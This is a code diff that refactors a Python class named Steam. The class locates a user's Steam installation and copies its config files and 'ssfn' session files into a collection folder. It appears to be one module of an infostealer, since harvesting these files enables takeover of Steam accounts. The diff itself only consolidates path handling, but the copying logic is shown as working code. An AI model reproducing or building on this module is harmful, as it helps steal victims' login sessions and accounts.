@@ -10,18 +10,15 @@ class Steam:
     """
     def __init__(self, storage_path: str, folder: str):
 
-        self.__storage_path = storage_path
-        self.__folder = folder
+        self.__full_path = path.join(storage_path, folder)
 
     def __create_folder(self) -> None:
         """
         Creates storage for the Steam module.
         :return: None
         """
-        storage_path = rf"{self.__storage_path}\{self.__folder}"
-
-        if not path.exists(storage_path):
-            makedirs(storage_path)
+        if not path.exists(self.__full_path):
+            makedirs(self.__full_path)
 
     @staticmethod
     def __get_steam_path() -> str:
@@ -49,17 +46,15 @@ class Steam:
             print(f"[Steam]: No steam found")
             return
 
-        storage_path = rf"{self.__storage_path}\{self.__folder}"
-
         configs = [file for file in listdir(rf"{steam_path}\config") if file != "avatarcache"]
 
         for config in configs:
-            copy(rf"{steam_path}\config\{config}", storage_path)
+            copy(rf"{steam_path}\config\{config}", self.__full_path)
 
         ssfns = sum([findall(r"ssfn.*", file) for file in listdir(steam_path)], [])
 
         for ssfn in ssfns:
-            copy(rf"{steam_path}\{ssfn}", storage_path)
+            copy(rf"{steam_path}\{ssfn}", self.__full_path)
 
     def run(self) -> None:
         """
